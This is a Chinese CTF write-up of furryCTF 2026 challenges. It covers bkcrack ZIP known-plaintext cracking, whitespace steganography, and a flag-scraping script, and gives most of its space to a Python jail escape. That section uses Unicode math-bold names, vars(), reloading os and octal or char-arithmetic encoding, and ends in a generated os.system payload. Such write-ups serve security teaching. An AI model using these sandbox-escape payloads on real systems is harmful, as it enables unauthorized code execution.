---
title: 2026.1.30 furryCTF
date: 2026-01-30 20:00:00
categories:
  - CTF
  - Misc
  - 比赛复现
  - 2026.1.30furryCTF
tags:
  - CTF
  - Misc
  - Writeup
  - 2026.1.30furryCTF
---
# <font style="color:rgb(37, 37, 37);">Misc-CyberChef</font>
chef语言

[https://tio.run/#chef](https://tio.run/#chef)

<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1770709798546-e468d675-cc4d-4650-80d7-eff28e5de7a9.png)

base64解码获得flag

`furryCTF{I_Wou1d_L1ke_S0me_Colon9l_Nugge7s_On_Cra7y_Thursd5y_VIVO_5O_AWA}`

# Misc-余音藏秘
QSSTV获得一张二维码

扫描后获得`U2FsdGVkX1/RxNkd2IGdQJ/tLDwU+2qkasEwAENOgBw=`

现在还没弄出来

# Misc-学习资料
<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1770363793091-9edd14d6-5a57-4029-bc05-cb3b3bdabb29.png)

构造文件头最方便的方法就是自己创建一个`.docx`文件 然后把固定的文件头摘录下来

`504B03040A0000000000874EE24000000000000000000000000009000000646F6350726F70732F504B`

```python
Microsoft Windows [版本 10.0.26200.7623]
(c) Microsoft Corporation。保留所有权利。

C:\Users\13964>cd C:\Users\13964\Desktop\Misc\bkcrack

C:\Users\13964\Desktop\Misc\bkcrack>bkcrack.exe -C flag.zip -c flag.docx -x 0 504B03040A0000000000874EE24000000000000000000000000009000000646F6350726F70732F504B
bkcrack 1.7.0 - 2024-05-26
[15:35:45] Z reduction using 34 bytes of known plaintext
100.0 % (34 / 34)
[15:35:46] Attack on 250815 Z values at index 6
Keys: dc5f5a25 ba003c16 064c2967
82.9 % (207982 / 250815)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 207982
[15:37:23] Keys
dc5f5a25 ba003c16 064c2967

C:\Users\13964\Desktop\Misc\bkcrack>bkcrack.exe -C flag.zip -c flag.docx -k dc5f5a25 ba003c16 064c2967 -d decrypted.docx
bkcrack 1.7.0 - 2024-05-26
[15:38:17] Writing deciphered data decrypted.docx
Wrote deciphered data (not compressed).

C:\Users\13964\Desktop\Misc\bkcrack>
```

`furryCTF{Ho0w_D1d_You_C0mE_H9re_xwx}`

## Misc-AA哥的JAVA
<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1770710431980-e2aefecf-3f3b-4f84-81cd-fa734ccae833.png)

vscode打开后看到很多箭头 sublime text打开

<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1770710481192-4b453cf7-0fa6-4ccd-97cb-e4ca0c4fc9f8.png)

在wps>文件>选项>把制表符 空格勾出来

把空格替换为0 制表符替换为1

注意每行开头的空格是回车 不需要提取

```bash
01110000011011110110011001110000011110110100100001110101010000010110110100110001010111110111010001110010011101010011000101111001010111110110001100110100011011100110111000110000011101000101111101101101001101000110101101100101010111110111001101100101011011100111001101100101010111110011000001100110010111110100101000110100011101100011010001111101
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1770711158601-f845fd5f-b734-4261-85c8-faf0e643afaf.png)

`pofp{HuAm1_tru1y_c4nn0t_m4ke_sense_0f_J4v4}`

## PPC-flagReader
```bash
import requests
import time
from binascii import unhexlify

BASE_URL = "http://ctf.furryctf.com:33126/api/flag/char/"

all_chars = []

for i in range(1, 481):
    url = f"{BASE_URL}{i}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                char = data["char"]
                all_chars.append(char)
                print(f"[{i}/480] Got: {char}")
            else:
                print(f"[{i}] API error: {data.get('error', 'Unknown')}")
                all_chars.append('?')
        else:
            print(f"[{i}] HTTP {response.status_code}")
            all_chars.append('?')
    except Exception as e:
        print(f"[{i}] Error: {e}")
        all_chars.append('?')
    
    time.sleep(0.1)  # 礼貌延迟

# 拼接
hex_str = ''.join(all_chars)
print("\n[+] Collected hex string length:", len(hex_str))

# 确保偶数长度
if len(hex_str) % 2 != 0:
    hex_str = hex_str[:-1]

# 两次 Base16 解码
try:
    first = unhexlify(hex_str)
    second = unhexlify(first.decode('utf-8'))
    flag = second.decode('utf-8')
    print("\n🎉 FLAG:", flag)
except Exception as e:
    print("[-] Decode failed:", e)
    print("First decode (hex):", first.hex() if 'first' in locals() else "N/A")
```

`🎉 FLAG: furryCTF{21ec42bf-d921-4b81-9be2-c4160c68c2cc-90321437-cb37-45d5-9cf4-0ae9abebcbe0-dccb8de2-2cb9-45a4-906a-7b6be4fcbfbf}`



# Misc-困兽之斗
## 一、题目分析
### 1.1 沙箱限制
```bash
┌──(kali㉿kali)-[~]
└─$ nc ctf.furryctf.com 32961

  ?__?
 /    \
|•ᴥ•|
| 0101 |
|H4CK3R|
 \____/                 

Well,I just banned letters,digits, '.' and ','
And also banned getattr() and help() by replacing it
And I banned os,subprocess module by pre-load it as strings
Just give up~
Or you still wanna try?
```

根据提示，ban掉了：

+ letters（字母） - 所有英文字母 a-z, A-Z
+ digits（数字） - 所有数字 0-9
+ 点号 `.` - 不能用点访问属性
+ 逗号 `,` - 不能用逗号分隔参数
+ `getattr()` 函数 - 被替换成空函数
+ `help()` 函数 - 被替换成空函数
+ `os` 模块 - 被预加载为字符串
+ `subprocess` 模块 - 被预加载为字符串

**简单说就是：不能直接写正常的 Python 代码，因为变量名、函数名都需要字母和点号**

### 1.2 攻击目标
我们需要绕过所有限制，最终执行系统命令（如 `cat flag`）来获取 flag。

## 二、绕过方法
### 2.1 绕过字母限制 - Unicode数字粗体
**核心原理：** Python 3 在解析代码时会自动将某些 Unicode 字符（如数学粗体字母）转换为标准 ASCII 字符

`**<font style="background-color:#FBDE28;">数学粗体不算字母</font>**`

```python
# 输入：𝐞𝐱𝐞𝐜  (数学粗体)
# Python 解析后：exec  (标准 ASCII)
```

```python
def bold_text(text):
    """将 ASCII 字母转换为 Unicode 数学粗体形式"""
    result = []
    for char in text:
        if 'A' <= char <= 'Z':
            bold_char = chr(ord(char) + 0x1D400 - ord('A'))
            result.append(bold_char)
        elif 'a' <= char <= 'z':
            bold_char = chr(ord(char) + 0x1D41A - ord('a'))
            result.append(bold_char)
        else:
            result.append(char)
    return ''.join(result)

if __name__ == "__main__":
    user_input = input("请输入要加粗的文本: ")
    print("\n转换结果:")
    print(bold_text(user_input))
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1770695495307-f2ab54f2-53b6-4ec2-84fd-7b0ea7de19d0.png)

eg:

+ `exec` → `𝐞𝐱𝐞𝐜`
+ `chr` → `𝐜𝐡𝐫`
+ `ord` → `𝐨𝐫𝐝`
+ `vars` → `𝐯𝐚𝐫𝐬`

### 2.2 绕过点号限制 - 使用 vars()
通常我们使用 `obj.method()` 来调用方法，但点号被禁用了。

**解决方案：** 使用 `vars()` 函数获取对象的属性字典

```python
# 传统方式（被禁用）
os.system('cat flag')

# 绕过方式
vars(os)['system']('cat flag')
```

**vars() 函数说明：**

+ `vars(obj)` 返回对象的 `__dict__` 属性
+ 可以通过字典访问的方式调用方法
+ 等价于 `obj.__dict__['method']()`

### 2.3 解封 os 模块 - 删除 sys.modules
题目预先将 `sys.modules['os']` 设置为字符串 `'Forbidden'`，导致无法正常导入。

Python 导入模块时会先检查 `sys.modules`：

1. 如果模块已存在，直接返回缓存的模块
2. 如果不存在，才会真正导入

```python
# 删除伪造的模块
del modules['os']

# 重新导入真正的 os 模块
__import__('os')
```

### 2.4 多行代码执行 - 使用 exec()
+ `eval()` 只能执行单个表达式
+ 逗号被禁用，无法使用海象运算符 `:=`
+ 需要执行多条语句（删除模块 + 导入模块 + 执行命令）

使用 `exec()` 执行多行代码：

```python
exec("del modules['os']\nvars(__import__('os'))['system']('cat flag')")
```

**exec() v.s. eval()**

+ `eval()`：只能执行单个表达式，有返回值
+ `exec()`：可以执行多条语句，无返回值

### 2.5 绕过数字限制 - 八进制 + 字符运算
数字被禁用，无法直接写字符串

#### 八进制转义
```python
# 'd' 的 ASCII 码是 100，八进制是 \144
"\144"  # 等价于 'd'
```

#### 字符运算
使用带重音符号的字符进行加减运算：

```python
# 'd' 的 ASCII 码是 100
chr(ord('ō') - ord('é'))  # 'ō' 是 333，'é' 是 233，差值是 100
```

**为什么用减法而不是加法？**

+ 加法可能产生 ASCII 字母（被检测）
+ 减法更容易控制结果范围

## 三、Payload 构造
### 3.1 第一阶段：使用八进制
```python
# 原始命令
exec("del modules['os']\nvars(__import__('os'))['system']('cat flag')")

# 转换为八进制（绕过字母和数字）
𝐞𝐱𝐞𝐜("\144\145\154\40\155\157\144\165\154\145\163['\157\163']\12\166\141\162\163(__\151\155\160\157\162\164__('\157\163'))['\163\171\163\164\145\155']('\143\141\164\40\146\154\141\147')")
```

**注意：** 换行符 `\n` 的八进制是 `\12`（不是 `\1\2`）

### 3.2 第二阶段：使用字符运算（完全绕过数字）
将八进制中的数字也替换为字符运算：

```python
𝐞𝐱𝐞𝐜(𝐜𝐡𝐫(𝐨𝐫𝐝('ō')-𝐨𝐫𝐝('é'))+𝐜𝐡𝐫(𝐨𝐫𝐝('ō')-𝐨𝐫𝐝('è'))+...)
```

```python
# gen_payload_full_unicode.py

def to_math_bold(s):
    """将 ASCII 字母转为 Unicode 数学粗体"""
    res = []
    for c in s:
        if 'A' <= c <= 'Z':
            res.append(chr(ord(c) - ord('A') + 0x1D400))
        elif 'a' <= c <= 'z':
            res.append(chr(ord(c) - ord('a') + 0x1D41A))
        else:
            res.append(c)
    return ''.join(res)

def char_to_expr(c):
    """
    将单个字符 c 转换为 chr(ord('ō') - ord(X)) 形式
    其中 X = chr(333 - ord(c))
    """
    code = ord(c)
    base_char = chr(333 - code)  # 因为 ord('ō') = 333
    # 返回字符串形式：chr(ord('ō')-ord('X'))
    return f"𝐜𝐡𝐫(𝐨𝐫𝐝('ō')-𝐨𝐫𝐝('{base_char}'))"

def str_to_char_expr(s):
    """将整个字符串转为字符运算拼接表达式"""
    parts = [char_to_expr(c) for c in s]
    # 用 '+' 连接（注意：不能用逗号！）
    return '+'.join(parts)

# 原始 payload 内容
payload_code = '''del modules['os']
vars(__import__('os'))['system']('cat flag')'''

# 步骤 1: 将 payload_code 转为字符运算表达式
expr = str_to_char_expr(payload_code)

# 步骤 2: 构造 exec( ... ) 调用
exec_call = f"𝐞𝐱𝐞𝐜({expr})"

print("=== Final Payload (Full Unicode Char Arithmetic) ===")
print(exec_call)
print("\n=== Length:", len(exec_call), "characters ===")
```

<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1770695960647-c756a65e-57b7-4ac8-9928-f3ce362366e7.png)

`furryCTF{b37bc8c8a3fe_jUSt_RUN_0Ut_Fr0M_thE_sand60x_WiTH_unIC0De}`

# <font style="color:rgb(37, 37, 37);">Web-PyEditor</font>
<!-- 这是一张图片，ocr 内容为： -->
![](/img/yuque/1769754273929-94ebf826-487c-46b1-8048-677deab71644.png)

